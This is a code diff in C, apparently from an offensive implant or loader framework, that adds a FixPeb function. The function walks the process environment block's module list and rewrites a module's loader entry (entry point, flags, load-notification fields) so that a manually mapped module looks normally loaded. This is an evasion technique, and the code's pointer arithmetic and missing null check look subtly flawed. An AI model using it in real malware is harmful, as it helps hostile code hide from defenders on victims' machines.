@@ -323,6 +323,38 @@ FUNC BOOL KillProcess(
 	return bSuccess;
 }
 
+FUNC BOOL FixPeb(
+    PCWSTR ModuleName
+) {
+    BLACKOUT_INSTANCE
+
+    PLDR_DATA_TABLE_ENTRY Data   = { 0 };
+    PLIST_ENTRY           Head   = &Instance()->Teb->ProcessEnvironmentBlock->Ldr->InLoadOrderModuleList;
+    PLIST_ENTRY           Entry  = Head->Flink;
+    PIMAGE_NT_HEADERS     NtHdrs = { 0 };
+    UINT64                Ep     = 0;
+    PVOID                 Module = NULL;
+
+    for ( ; Head != Entry ; Entry = Entry->Flink ) {
+        Data = C_PTR( Entry );
+
+        if ( StringCompareW( Data->BaseDllName.Buffer, ModuleName ) == 0 ) {
+            Module = Data->DllBase;
+            break;
+        }
+     }
+
+    NtHdrs = (PIMAGE_NT_HEADERS)( (PBYTE)( Module ) + ( (PIMAGE_DOS_HEADER)( Module ) )->e_lfanew );
+    Ep     = Module + NtHdrs->OptionalHeader.AddressOfEntryPoint;
+    
+    Data->EntryPoint = Ep;
+    Data->Flags      = 0x8a2cc;
+    Data->ImageDll   = 1;
+    Data->LoadNotificationsSent = 1;
+    Data->ProcessStaticImport   = 0;
+    return TRUE;
+}
+
 FUNC PVOID LdrModuleAddr(
     _In_ ULONG Hash
 ) {
